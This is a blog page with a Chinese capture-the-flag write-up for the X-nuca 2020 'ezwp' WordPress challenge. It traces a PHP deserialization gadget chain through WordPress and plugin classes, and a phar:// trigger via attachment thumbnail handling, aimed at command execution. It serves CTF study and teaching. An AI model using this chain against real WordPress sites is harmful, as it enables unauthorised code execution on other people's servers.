<!DOCTYPE html>
<html lang="en">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"srpopty.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="X-nuca 2020 Web challenge ezwp writeup.">
<meta property="og:type" content="article">
<meta property="og:title" content="X-nuca 2020 ezwp Writeup">
<meta property="og:url" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/index.html">
<meta property="og:site_name" content="Shadow Gallery">
<meta property="og:description" content="X-nuca 2020 Web challenge ezwp writeup.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/1.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/2.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/3.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/4.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/5.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/7.png">
<meta property="og:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/6.png">
<meta property="article:published_time" content="2020-12-10T06:26:15.000Z">
<meta property="article:modified_time" content="2020-12-13T04:09:17.104Z">
<meta property="article:author" content="Srpopty">
<meta property="article:tag" content="WriteUp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/1.png">

<link rel="canonical" href="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true
  };
</script>

  <title>X-nuca 2020 ezwp Writeup | Shadow Gallery</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Shadow Gallery" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Shadow Gallery</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">Live in the shadow</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
    <link itemprop="mainEntityOfPage" href="https://srpopty.github.io/2020/12/10/XNUCA2020-ezwp-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Srpopty">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shadow Gallery">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          X-nuca 2020 ezwp Writeup
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-12-10 14:26:15" itemprop="dateCreated datePublished" datetime="2020-12-10T14:26:15+08:00">2020-12-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-13 12:09:17" itemprop="dateModified" datetime="2020-12-13T12:09:17+08:00">2020-12-13</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <div class="post-description">X-nuca 2020 Web challenge ezwp writeup.</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="0x0-WordPress"><a href="#0x0-WordPress" class="headerlink" title="0x0 WordPress"></a>0x0 WordPress</h1><p>题目直接给了一个WordPress的整站，题目附件除了源码还很贴心的给了数据库，在本地搭建好环境以后就可以调试了。先是用wpscan扫描一下，发现除了Contact-Form-7插件，整个站包括wordpress都是最新版，从数据库中可以看到有一个admin的管理员用户，但是并没有给出admin的密码，一般来说题目是不会让你去爆破管理员密码的，所以题目肯定是需要注册一个低等级账号进行提权。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">-- Dumping data for table &#96;wp_users&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES &#96;wp_users&#96; WRITE;</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;wp_users&#96; DISABLE KEYS *&#x2F;;</span><br><span class="line">INSERT INTO &#96;wp_users&#96; VALUES (1,&#39;admin&#39;,&#39;&#39;,&#39;admin&#39;,&#39;admin@qq.com&#39;,&#39;http:&#x2F;&#x2F;192.168.248.151&#39;,&#39;2020-12-05 09:10:11&#39;,&#39;&#39;,0,&#39;admin&#39;);</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;wp_users&#96; ENABLE KEYS *&#x2F;;</span><br><span class="line">UNLOCK TABLES;</span><br></pre></td></tr></table></figure>



<p>再看过期的Contact-Foem-7插件，它的版本是5.0.3，而最新版已经是5.3.1，5.0.3版本是存在漏洞的，所以题目的预期解应该是需要利用该插件去提权，但是在比赛中并没有完全利用成功，而是使用了另一种非预期解反序列化执行命令拿到了flag，关于Contact-Foem-7插件的利用，将在0x6节中详细分析。</p>
<h1 id="0x1-Unserialize-POP-Chain"><a href="#0x1-Unserialize-POP-Chain" class="headerlink" title="0x1 Unserialize POP Chain"></a>0x1 Unserialize POP Chain</h1><p>题目最终的目的是执行命令，运行根目录下的readflag程序获取flag，所以首先就需要找到一个可以执行任意命令或者代码的地方。在文件FilteredIterator.php中有一个Requests_Utility_FilteredIterator类，该类继承自数组迭代器，在current方法中会执行<code>call_user_func($this-&gt;callback, $value);</code>，这看起来是一个非常漂亮的执行php代码的地方，只要可以控制该类的data与callback成员变量，就可以执行任意数量参数的php函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/Requests/Utility/FilteredIterator.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requests_Utility_FilteredIterator</span> <span class="keyword">extends</span> <span class="title">ArrayIterator</span> </span>&#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Callback to run as a filter</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@var</span> callable</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">protected</span> $callback;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Create a new iterator</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> array $data</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> callable $callback Callback to be called on each value</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data, $callback</span>) </span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::__construct($data);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Get the current item&#x27;s value after filtering</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		$value = <span class="built_in">parent</span>::current();</span><br><span class="line">		$value = call_user_func(<span class="keyword">$this</span>-&gt;callback, $value);</span><br><span class="line">		<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在php中迭代器主要在foreach中使用（例如php的原生数组Array类），当一个迭代器在foreach中开始迭代的时候，每次迭代都将会调用current函数以返回一个迭代器中存储的对象，所以只需要对Requests_Utility_FilteredIterator类进行迭代就可以自动触发call_user_func。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;b&#x27;</span>=&gt;<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>所以下一步就是需要找到一个魔术方法，该魔术方法中会对自身的某一个成员变量进行foreach迭代。对于魔术方法的寻找，很多人可能喜欢去寻找__wakeup或者__toString，但是其实最佳的目标就是构造函数__construct和析构函数__destruct，这两个函数会经常在各种类中出现，而且触发方式非常简单，经过长时间的寻找，很幸运，在插件all-in-one-event-calendar中就存在Ai1ec_Shutdown_Controller类的析构函数，该析构函数中会对$this-&gt;_preserve遍历进行迭代。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-content/plugins/all-in-one-event-calendar/app/controller/shutdown.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ai1ec_Shutdown_Controller</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// replace globals from our internal store</span></span><br><span class="line">            $restore = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> ( <span class="keyword">$this</span>-&gt;_preserve <span class="keyword">as</span> $name =&gt; $class ) &#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>至此，我们找到了一个可以成功触发反序列化的POP链：对Ai1ec_Shutdown_Controller类进行序列化，该类的_preserve变量需要设置为一个Requests_Utility_FilteredIterator类，这个类中的callback与value组合就可以执行任意php函数。</p>
<h1 id="0x2-Exploit-Chain"><a href="#0x2-Exploit-Chain" class="headerlink" title="0x2  Exploit Chain"></a>0x2  Exploit Chain</h1><p>利用上节中构造的POP链，就可以利用反序列化执行任意php函数，但是接下来还需要找到一个地方可以触发反序列化，在WordPress中直接利用unserialize函数进行反序列化可能性不大，但是WordPress中是可以上传文件的，我们可以上传一个Phar文件，最后利用phar伪协议即可触发POP链。</p>
<p>最开始我们需要找到一个可以触发伪协议的地方，Phar伪协议的触发需要使用php文件系统函数，如下所示第27行的file_exists函数看起来是一个很好的选择。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve thumbnail for an attachment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $post_id Optional. Attachment ID. Default 0.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string|false False on failure. Thumbnail file path on success.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_get_attachment_thumb_file</span>(<span class="params"> $post_id = <span class="number">0</span> </span>) </span>&#123;</span><br><span class="line">	$post_id = (<span class="keyword">int</span>) $post_id;</span><br><span class="line">	$post    = get_post( $post_id );</span><br><span class="line">	<span class="keyword">if</span> ( ! $post ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$imagedata = wp_get_attachment_metadata( $post-&gt;ID );</span><br><span class="line">	<span class="keyword">if</span> ( ! is_array( $imagedata ) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$file = get_attached_file( $post-&gt;ID );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $imagedata[<span class="string">&#x27;thumb&#x27;</span>] ) ) &#123;</span><br><span class="line">		$thumbfile = str_replace( basename( $file ), $imagedata[<span class="string">&#x27;thumb&#x27;</span>], $file );</span><br><span class="line">		<span class="keyword">if</span> ( file_exists( $thumbfile ) ) &#123;</span><br><span class="line">			<span class="comment">/**</span></span><br><span class="line"><span class="comment">			 * Filters the attachment thumbnail file path.</span></span><br><span class="line"><span class="comment">			 *</span></span><br><span class="line"><span class="comment">			 * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">			 *</span></span><br><span class="line"><span class="comment">			 * <span class="doctag">@param</span> string $thumbfile File path to the attachment thumbnail.</span></span><br><span class="line"><span class="comment">			 * <span class="doctag">@param</span> int    $post_id   Attachment ID.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">return</span> apply_filters( <span class="string">&#x27;wp_get_attachment_thumb_file&#x27;</span>, $thumbfile, $post-&gt;ID );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们需要使thumbfile的值可控，可以看到thumbfile的值是从file与imagedata来的，再看get_attached_file函数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve attached file path based on attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * By default the path will go through the &#x27;get_attached_file&#x27; filter, but</span></span><br><span class="line"><span class="comment"> * passing a true to the $unfiltered argument of get_attached_file() will</span></span><br><span class="line"><span class="comment"> * return the file path unfiltered.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The function works by getting the single post meta name, named</span></span><br><span class="line"><span class="comment"> * &#x27;_wp_attached_file&#x27; and returning it. This is a convenience function to</span></span><br><span class="line"><span class="comment"> * prevent looking up the meta name and provide a mechanism for sending the</span></span><br><span class="line"><span class="comment"> * attached filename through a filter.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.0.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int  $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $unfiltered    Optional. Whether to apply filters. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string|false The file path to where the attached file should be, false otherwise.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_attached_file</span>(<span class="params"> $attachment_id, $unfiltered = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">	$file = get_post_meta( $attachment_id, <span class="string">&#x27;_wp_attached_file&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If the file is relative, prepend upload dir.</span></span><br><span class="line">	<span class="keyword">if</span> ( $file &amp;&amp; <span class="number">0</span> !== strpos( $file, <span class="string">&#x27;/&#x27;</span> ) &amp;&amp; ! preg_match( <span class="string">&#x27;|^.:\\\|&#x27;</span>, $file ) ) &#123;</span><br><span class="line">		$uploads = wp_get_upload_dir();</span><br><span class="line">		<span class="keyword">if</span> ( <span class="literal">false</span> === $uploads[<span class="string">&#x27;error&#x27;</span>] ) &#123;</span><br><span class="line">			$file = $uploads[<span class="string">&#x27;basedir&#x27;</span>] . <span class="string">&quot;/<span class="subst">$file</span>&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( $unfiltered ) &#123;</span><br><span class="line">		<span class="keyword">return</span> $file;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the attached file based on the given ID.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string|false $file          The file path to where the attached file should be, false otherwise.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> int          $attachment_id Attachment ID.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> apply_filters( <span class="string">&#x27;get_attached_file&#x27;</span>, $file, $attachment_id );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这个函数首先从数据库中_wp_attached_file字段读取附件路径，而_wp_attached_file是我们可以控制的，具体的控制方法会在后文中提到，控制了file以后不能让程序流程进入25行的if中，否则会在file前面拼接上传目录，导致file只能部分可控。</p>
<p>再看wp_get_attachment_thumb_file函数中完全控制thumbfile的条件是<code>str_replace( basename( $file ), $imagedata[&#39;thumb&#39;], $file )</code>，如果basename(file)和file的值相同，那么该语句就会直接返回imagedata[‘thumb’]，需要注意的是站点运行在Linux上，如果输入的file是一个Windows下的路径例如<code>Z:\Z</code>，就可以满足正则，从而不会进入到if中，而外面的basename就会将其当作一个目录，直接返回file（假如站点运行在Windows上，basename会返回”Z”，Linux下直接返回”Z:\Z”）。</p>
<p>再看imagedata是怎么来的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// wp-includes/post.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieves attachment metadata for attachment ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int  $attachment_id Attachment post ID. Defaults to global $post.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool $unfiltered    Optional. If true, filters are not run. Default false.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array|false &#123;</span></span><br><span class="line"><span class="comment"> *     Attachment metadata. False on failure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $width      The width of the attachment.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> int    $height     The height of the attachment.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> string $file       The file path relative to `wp-content/uploads`.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> array  $sizes      Keys are size slugs, each value is an array containing</span></span><br><span class="line"><span class="comment"> *                              &#x27;file&#x27;, &#x27;width&#x27;, &#x27;height&#x27;, and &#x27;mime-type&#x27;.</span></span><br><span class="line"><span class="comment"> *     <span class="doctag">@type</span> array  $image_meta Image metadata.</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_get_attachment_metadata</span>(<span class="params"> $attachment_id = <span class="number">0</span>, $unfiltered = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line">	$attachment_id = (<span class="keyword">int</span>) $attachment_id;</span><br><span class="line"></span><br><span class="line">	$post = get_post( $attachment_id );</span><br><span class="line">	<span class="keyword">if</span> ( ! $post ) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$data = get_post_meta( $post-&gt;ID, <span class="string">&#x27;_wp_attachment_metadata&#x27;</span>, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( $unfiltered ) &#123;</span><br><span class="line">		<span class="keyword">return</span> $data;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the attachment meta data.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.1.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> array|bool $data          Array of meta data for the given attachment, or false</span></span><br><span class="line"><span class="comment">	 *                                  if the object does not exist.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> int        $attachment_id Attachment post ID.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> apply_filters( <span class="string">&#x27;wp_get_attachment_metadata&#x27;</span>, $data, $post-&gt;ID );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看到imagedata就是数据库中的_wp_attachment_metadata字段，而该字段也是可控的。在可以完全控制thumbfile以后我们需要找到一个可以调用wp_get_attachment_thumb_file函数的地方。</p>
